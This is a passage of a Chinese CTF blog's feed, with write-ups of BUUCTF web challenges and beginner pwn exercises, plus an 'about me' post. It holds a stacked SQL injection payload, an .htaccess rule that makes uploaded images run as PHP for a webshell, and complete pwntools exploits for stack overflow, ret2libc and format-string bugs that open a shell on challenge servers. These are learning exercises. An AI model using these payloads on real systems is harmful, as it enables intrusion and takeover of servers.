NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</p><p>通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-46-1010x1024.png" class><p>payload：1′;handler FlagHere open;handler FlagHere read first%23</p><p>get flag！</p><h2 id="RoarCTF-2019-Easy-Java1"><a href="#RoarCTF-2019-Easy-Java1" class="headerlink" title="[RoarCTF 2019]Easy Java1"></a>[RoarCTF 2019]Easy Java1</h2><p><span style="color:red">考点：Javaweb中的WEB-INF目录下的泄露</span></p><p>打开题目，随便试了下弱口令登录，无果。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-1024x765.png" class><p>点击help，发现filename后面跟的文件名，而并不会打开这个文件而是把文件名显示出来了</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-1-1024x91.png" class><p>抓包，尝试更换请求方式，请求成功并且得到了数据，证明通过post方法可以进行文件访问。</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-2-1024x288.png" class><p>在JAVAWEB中，WEB-INF路径是web应用的安全目录，客户端无法访问，只有服务端才能够访问。这里面的常见文件类型如下</p><p>/WEB-INF/web.xml Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p><p>/WEB-INF/classes/ 包含了站点所有用的 <strong>class</strong> 文件，包括 <strong>servlet</strong> <strong>class</strong> 和非<strong>servlet</strong> <strong>class</strong>，他们不能包含在 .<strong>jar</strong>文件中。</p><p>/WEB-INF/lib/ 存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件。</p><p>/WEB-INF/src/ 源码目录，按照包名结构放置各个Java文件。</p><p>/WEB-INF/database.properties 数据库配置文件</p><p>/WEB-INF/tags/ 存放了自定义标签文件，该目录并不一定为 tags，可以根据自己的喜好和习惯为自己的标签文件库命名，当使用自定义的标签文件库名称时，在使用标签文件时就必须声明正确的标签文件库路径。例如：当自定义标签文件库名称为 simpleTags 时，在使用 simpleTags 目录下的标签文件时，就必须在 jsp 文件头声明为：&lt;%@ taglibprefix=”tags” tagdir=”/WEB-INF /simpleTags” % &gt;。</p><p>/WEB-INF/jsp/ jsp 1.2 以下版本的文件存放位置。改目录没有特定的声明，同样，可以根据自己的喜好与习惯来命名。此目录主要存放的是 jsp 1.2 以下版本的文件，为区分 jsp 2.0 文件，通常使用 jsp 命名，当然你也可以命名为 jspOldEdition 。</p><p>/WEB-INF/jsp2/ 与 jsp 文件目录相比，该目录下主要存放 Jsp 2.0 以下版本的文件，当然，它也是可以任意命名的，同样为区别 Jsp 1.2以下版本的文件目录，通常才命名为 jsp2。</p><p>META-INF 相当于一个信息包，目录中的文件和目录获得Java 2平台的认可与解释，用来配置应用程序、扩展程序、类加载器和服务manifest.mf文件，在用jar打包时自动生成。</p><p>转载至<a href="https://www.anquanke.com/post/id/205215#h2-0">https://www.anquanke.com/post/id/205215#h2-0</a></p><p>我们访问WEB-INF/web.xml看一下web应用配置规则</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-3.png" class><p>注意servlet-class标签，该标签内容为com.wm.ctf.FlagController</p><p>这个标签记录了<code>/WEB-INF/classes/</code>的类，也就是说，这个标签对应的内容是在/WEB-INF/classes/中的，那么这里对应的flag就在</p><p>WEB-INF/classes/con/wm/ctf/FlagController.class（注意，文件后缀加上.class）</p><p>访问，发现一段base64，解密后获得flag</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-4.png" class><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;32d00317-9ae9-4aec-8fec-5fd179076b72&#125;</span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p><span style="color:red">考点: .htaccess配置文件，图片马</span></p><p>尝试上传图片，给出路径</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-5-1024x192.png" class><p>尝试phtml，php等后缀的文件上传被拦截</p><img src="/2020/12/18/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-6-1024x174.png" class><p>图片马需要将图片作为php解析，可以使用文件包含或者配置文件更改解析规则。这里没有文件包含，但是可以上传配置文件。</p><p>我们上传.htaccess内容为</p><p>AddType application/x-httpd-php .jpg</p><p>将所有.jpg文件当成php代码解析</p><p>上传.htaccess文件将</p><p>Content-Type: application/octet-stream改为Content-Type: image/jpg</p><p>蚁剑链接Getflag！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;护网杯-2018-WEB-easy-tornado-1&quot;&gt;&lt;a href=&quot;#护网杯-2018-WEB-easy-tornado-1&quot; class=&quot;headerlink&quot; title=&quot;护网杯 2018-WEB-easy_tornado 1&quot;&gt;&lt;/a&gt;护网杯 2</summary>
      
    
    
    
    
    <category term="BUUCTF" scheme="http://example.com/tags/BUUCTF/"/>
    
    <category term="CTF复现" scheme="http://example.com/tags/CTF%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>pwn入门体验</title>
    <link href="http://example.com/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/"/>
    <id>http://example.com/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/</id>
    <published>2020-12-17T14:42:38.000Z</published>
    <updated>2021-02-04T15:08:53.135Z</updated>
    
    <content type="html"><![CDATA[<p>这是从原来的博客搬过来的，之前刚开始接触pwn学的，现在已经转战web，留作纪念。一下题目均来自攻防世界pwn新手区</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2:"></a><strong>level2</strong>:</h2><p>连接题目，发现一个输入口</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-9.png" class><p>检查保护措施</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-10.png" class><p>打开ida,观察主函数，主函数很简单，调用vulnerable_function后输出Hello，World</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-11.png" class><p>进入函数vulnerable_function，buf最大字节长度0x88，比0x100小，存在溢出</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-12.png" class><p>观察函数列表，没有发现可以执行shellcode的函数</p><p>根据题目信息，需要用到ROP，猜测需要构建函数栈帧。缺少变量，shift+F12查看一下字符串，发现了我们需要的东西</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-13.png" class><p>思路：将buf溢出，覆盖read函数的返回地址为_system函数。然后用/bin/sh构建一个栈帧，执行shellcode</p><p>_system = 0x08048320</p><p>shell = 0x0804A024</p><p>payload：’a’*0x88 + p32(1) + p32(_system) + p32(1) + p32(shell) + P32(1)</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">res &#x3D; remote(&#39;220.249.52.133&#39;,37278)</span><br><span class="line">_system &#x3D; 0x08048320</span><br><span class="line">shellcode &#x3D; 0x0804A024</span><br><span class="line">payload &#x3D; &#39;A&#39;*0x88 + p32(1) + p32(_system) + p32(1) + p32(shellcode)</span><br><span class="line">res.sendline(payload)</span><br><span class="line">res.interactive()</span><br></pre></td></tr></table></figure><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-15.png" class><h2 id="when-did-you-born："><a href="#when-did-you-born：" class="headerlink" title="when_did_you_born："></a>when_did_you_born：</h2><p>链接题目，输入口有2个，分别输入出生日期和姓名</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-16.png" class><p>查看防御措施，存在Canary，无法构造栈帧</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-17.png" class><p>进入ida查看主函数，发现意图明显。第一次输入的Birth不能为1926，当变量V5为1926的时候输出flag。那么推测第二次输入姓名存在溢出，将V5变量覆盖为1926，输出flag</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-18.png" class><p>验证猜想正确var_20对应V4变量，var18对应V5变量</p><p><img src="/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C%5C%E6%8D%95%E8%8E%B7-19.png"></p><p>构造payload：’A’*8 + p32(1926)</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">res &#x3D; remote(&#39;220.249.52.133&#39;,42242)</span><br><span class="line">payload &#x3D; &#39;A&#39;*8 + p32(1926)</span><br><span class="line">res.recvuntil(&#39;Birth&#39;)</span><br><span class="line">res.sendline(&#39;123&#39;)</span><br><span class="line">res.recvuntil(&#39;Name&#39;)</span><br><span class="line">res.sendline(payload)</span><br><span class="line">res.interactive()</span><br></pre></td></tr></table></figure><p>get flag！</p><h2 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h2><p>链接题目，看一下大致内容</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-20.png" class><p>将level3用ida打开查看，进入主函数，内容非常简单</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-21.png" class><p>进而进入vulnerable_function查看，发现read函数存在溢出点</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-22.png" class><p>观察函数列表，未发现system函数，打开字符串查找未发现/bin/sh字样字符串。题目压缩包附带了一个libc文件，考虑到本题用到ret2libc分析。从libc中载入system函数和/bin/sh字符串，从而达到获取权限目的。</p><p>使用ida打开附件libc_32.so.6</p><p>搜索到system函数，函数地址为0x3A940</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-23.png" class><p>通过命令 strings -a -t x libc | grep “/bin/sh” 查找到/bin/sh在libc中的偏移为15902b</p><p>现在我们只需要知道libc的地址，从而计算出system和/bin/sh的地址即可，要想得到libc地址，则需要通过得到write函数的真实地址，用write函数的真实地址减去write函数在libc中的地址便可得到libc的地址。</p><p>如何得到write函数的真实地址？用ida打开level3我们发现，write函数的地址属于plt部分，这个并不是write函数的真实地址</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-25.png" class><p>而我们知道，动态链接库加载函数的时候，如果是第一次加载这个函数，便会通过plt表中对应位置的代码调用连接器来解析write函数在外部的地址，并且将这个真实地址(write函数的)返回填写到write_got.plt中。而我们需要做的就是通过溢出，首先执行plt中对应的关于write函数的代码，这个时候就会调用连接器查找write函数，并且把write函数真实地址已经存放进了got.plt这个表对应write函数的位置中了。当这个过程结束后，我们再次返回到vulnerable_function这个函数中，再次调用write函数，将参数传入write函数使他输出write函数的真实地址（在got.plt表中对应的位置）这样便获得了write函数的真实地址。</p><p>通过ida查找，可以发现:</p><p>write_plt = 0x08048340 write函数plt地址<br>write_got.plt = 0x0804A018 write函数got.plt地址<br>vulnerable_function = 0x0804844B write函数父函数地址</p><p>第一次溢出payload：<br>payload = ‘A’*0x88 + p32(1) + p32(write_plt) + p32( vulnerable_function) + p32(1) + p32(write_got.plt) + p32(0x4)</p><p>‘A’*0X88：填充字符串buf</p><p>P32(1)：劫持EIP</p><p>P32(write_plt)：函数返回到此处调用连接器，将write函数真实地址覆盖到got.plt表中</p><p>p32( vulnerable_function)：函数返回write函数父函数</p><p>p32(1) 传入参数1</p><p>p32(write_got.plt)传入参数2</p><p>p32(0x4)传入参数3</p><p>接下来获取write函数的真实地址</p><p>write_got_addr = u32(sh.recv())</p><p>计算出libc地址：libc_addr = write_got_addr – libc.symbols[‘write’]</p><p>计算出system真实地址：sys_addr = libc_addr + libc.symbols[‘system’]</p><p>计算bin字符串真实地址：bin_sh_addr = libc_addr + 0x15902b</p><p>第二次payload：payload2 = ‘A’*0x88 + p32(1) + p32(sys_addr) + p32(1) + p32(bin_sh_addr) 简单的溢出，劫持eip，覆盖返回地址，返回地址，传参</p><p>完整exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">sh &#x3D; remote(&#39;220.249.52.133&#39;,49400)</span><br><span class="line">libc&#x3D;ELF(&#39;libc&#39;)</span><br><span class="line"> </span><br><span class="line">#get func address</span><br><span class="line">write_plt &#x3D; 0x08048340</span><br><span class="line">write_got_plt &#x3D; 0x0804A018</span><br><span class="line">vulnerable_function &#x3D; 0x0804844B</span><br><span class="line">payload &#x3D; &#39;A&#39;*0x88 + p32(1) + p32(write_plt) + p32( vulnerable_function) + p32(1) + p32(write_got_plt) + p32(0x4)</span><br><span class="line"> </span><br><span class="line">sh.sendlineafter(&quot;Input:\n&quot;,payload)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">write_got_addr &#x3D; u32(sh.recv())</span><br><span class="line"></span><br><span class="line">libc_addr &#x3D; write_got_addr - libc.symbols[&#39;write&#39;]</span><br><span class="line"></span><br><span class="line">sys_addr &#x3D; libc_addr + libc.symbols[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">bin_sh_addr &#x3D; libc_addr + 0x15902b</span><br><span class="line"></span><br><span class="line">payload2 &#x3D; &#39;A&#39;*0x88 + p32(1) + p32(sys_addr) + p32(1) + p32(bin_sh_addr)</span><br><span class="line"> </span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-26.png" class><p>本题感谢N0p3的大力支持！！！！</p><h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>老规矩，连接题目，实现类似于留言板的小程序</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-27.png" class><p>查看保护措施存在栈溢出保护，DEP保护</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-28.png" class><p>ida查看，可以发现，将pwnme变量赋值为8即可获得flag。pwnme上面的一行代码引起了我们的主意。程序直接将printf函数的参数控制权限交给了我们，也就是说这里存在格式化字符串漏洞。我们需要利用这一漏洞将pwnme变为8</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/image.png" class><p>想要修改pwnme的值首先就要知道pwnme的地址以及他在栈中的偏移，简单的测试一下。我通过print函数输入了字符串“bbbb-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x”它有什么用？首先，根据printf函数的特性，bbbb被入栈用于输出，而后面的%x由于没有对应的数据输出，那么将会输出栈中每个字节的数据。我们根据输出结果不难发现，首先输出的是bbbb，这是正常printf函数该做的事情，然后连续输出栈中数据，直到我们发现了62626262，这是我们输出的数据bbbb的十六进制。那么数一下就不难发现，我们向printf函数中输入的字符串是存储在栈中第10个字节处，那么我们就可以将pwnme变量的地址保存在第十个字节处，在利用%n写入数据8达到修改pwnme数据的目的。</p><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/%E6%8D%95%E8%8E%B7-29.png" class><p>ida查找到pwnme变量的地址为0x0804A068</p><p>pwnme_addr = 0x0804A068</p><p>payload：p32(pwnme_addr) + ‘a’*4 + ‘%10$n’</p><p>p32(pwnme_addr)首先保存在栈中偏移10个字节的地方，然后用4个a补充4个字节，那么p32(pwnme_addr) + a*4便拥有8个字节 %10$n的意思就是将他前面字符串的字节个数赋值到第10位的地方也就是pwnme地址所在的位置。那么这样pwnme便完成了数字8的赋值。</p><p>完整exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">res &#x3D; remote(&#39;220.249.52.133&#39;,42809)</span><br><span class="line">pwnme_addr &#x3D; 0x0804A068</span><br><span class="line">res.recvuntil(&#39;name&#39;)</span><br><span class="line">res.sendline(&#39;XJJ&#39;)</span><br><span class="line">payload &#x3D; p32(pwnme_addr) + &#39;a&#39;*4 + &#39;%10$n&#39;</span><br><span class="line">res.recvuntil(&#39;message&#39;)</span><br><span class="line">res.sendline(payload)</span><br><span class="line">res.interactive()</span><br></pre></td></tr></table></figure><img src="/2020/12/17/pwn%E5%85%A5%E9%97%A8%E4%BD%93%E9%AA%8C/image-1.png" class><p>get flag！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这是从原来的博客搬过来的，之前刚开始接触pwn学的，现在已经转战web，留作纪念。一下题目均来自攻防世界pwn新手区&lt;/p&gt;
&lt;h2 id=&quot;level2&quot;&gt;&lt;a href=&quot;#level2&quot; class=&quot;headerlink&quot; title=&quot;level2:&quot;&gt;&lt;/a&gt;&lt;</summary>
      
    
    
    
    
    <category term="pwn入门" scheme="http://example.com/tags/pwn%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>aboutme</title>
    <link href="http://example.com/2020/12/15/aboutme/"/>
    <id>http://example.com/2020/12/15/aboutme/</id>
    <published>2020-12-15T09:32:14.000Z</published>
    <updated>2021-02-04T15:02:50.851Z</updated>
    
    <content type="html"><![CDATA[<p>一名菜鸡ctfer，web🐕，努力学习中……</p><p>原来的博客太卡了，现在重新搭建博客。之前的文章搬了一部分留作纪念，在这里重新开始写文章。</p><img src="/2020/12/15/aboutme/image-20210128171024124.png" class><p>联系方式：</p><p>微信：</p><p><a href="https://imgchr.com/i/rMJaa8"><img src="https://s3.ax1x.com/2020/12/15/rMJaa8.png" alt="rMJaa8.png"></a></p><p>QQ：</p><p><a href="https://imgchr.com/i/rMJUVf"><img src="https://s3.ax1x.com/2020/12/15/rMJUVf.png" alt="rMJUVf.png"></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一名菜鸡ctfer，web🐕，努力学习中……&lt;/p&gt;
&lt;p&gt;原来的博客太卡了，现在重新搭建博客。之前的文章搬了一部分留作纪念，在这里重新开始写文章。&lt;/p&gt;
&lt;img src=&quot;/2020/12/15/aboutme/image-20210128171024124.png</summary>
      
    
    
    
    
  </entry>
  
</feed>
